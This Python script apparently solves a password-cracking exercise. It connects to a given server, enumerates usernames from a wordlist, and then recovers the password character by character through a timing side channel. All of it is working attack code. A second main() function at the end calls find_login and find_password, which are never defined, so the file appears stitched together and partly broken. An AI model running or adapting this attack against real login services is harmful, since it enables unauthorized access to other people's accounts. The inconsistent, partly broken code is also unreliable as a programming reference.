import socket
import sys
import json
import string
import time


class Hack:
    def __init__(self, address, port):
        self.my_socket = socket.socket()
        self.my_socket.connect((address, port))
        self.login = ''
        self.password = ''

    def hack_login(self):
        with open('logins.txt', 'r') as login_file:
            for line in login_file:
                login_json = json.dumps({'login': line.strip(), 'password': ''})
                self.my_socket.send(login_json.encode())
                login_response = self.my_socket.recv(1024)
                login_msg = json.loads(login_response.decode())
                if login_msg['result'] == 'Wrong password!':
                    self.login = line.strip()
                    break

    def hack_password(self):
        password_elements = list(string.digits + string.ascii_letters)
        while True:
            for element in password_elements:
                password_cur = self.password
                password_cur += element
                password_json = json.dumps({'login': self.login, 'password': password_cur})
                self.my_socket.send(password_json.encode())
                start = time.perf_counter()
                password_response = self.my_socket.recv(1024)
                end = time.perf_counter()
                password_msg = json.loads(password_response.decode())
                if (end - start) * 1000000 >= 90000:
                    self.password = password_cur
                    break
                if password_msg['result'] == 'Connection success!':
                    self.password = password_cur
                    return password_cur


hacker = Hack(sys.argv[1], int(sys.argv[2]))
hacker.hack_login()
hacker.hack_password()
result = json.dumps({"login": hacker.login, "password": hacker.password})
print(result)


def main():
    args = sys.argv
    message = {"login": "", "password": ""}
    with socket.socket() as client_socket:
        client_socket.connect((args[1], int(args[2])))
        find_login(client_socket, message)
        find_password(client_socket, message)
    print(json.dumps(message))


if __name__ == "__main__":
    main()


